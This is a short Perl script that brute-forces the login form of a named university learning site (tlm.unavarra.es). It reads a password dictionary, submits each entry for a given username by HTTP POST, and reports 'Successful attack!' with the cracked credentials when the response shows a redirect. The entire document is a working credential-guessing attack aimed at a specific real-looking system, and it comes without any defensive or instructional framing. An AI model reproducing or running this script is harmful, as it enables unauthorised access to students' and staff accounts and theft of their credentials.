# tlm web form attack perl script
use LWP::UserAgent;
use Term::ANSIColor;
use strict ;
use warnings;
if ($#ARGV < 1) {	
	print "Usage:\n";
	print "perl tlm.pl <username> <dictionaryFile>";
	exit();
}
my $tlmurl = "https://www.tlm.unavarra.es/login/index.php";
my $user = $ARGV[0];
my $file = $ARGV[1];
open (FILE,$file) || die color("red"), "Could not open file '$file'\n", color("reset");
my @dictionary = <FILE> ;
my $wagent = new LWP::UserAgent;
my $request = new HTTP::Request 'POST',$tlmurl;
$a=0;
foreach(@dictionary) {
	my $password = $_ ;
        $a+=1;
	chomp($password) ;
	$request->content_type('application/x-www-form-urlencoded');
	$request->content("&username=$user&password=$password");
	my $respons = $wagent->request($request);		
	my $response = $respons->as_string;	
	if ( $response =~ /<title>Redireccionar/) {	
		print color("green"),"Successful attack! Credentials are: username=$user and password=$password\n", color("reset");
                exit() ;	
	}
        if ($a%100==0){
                print "Llevamos $a combinaciones\n" ;
        }		
}
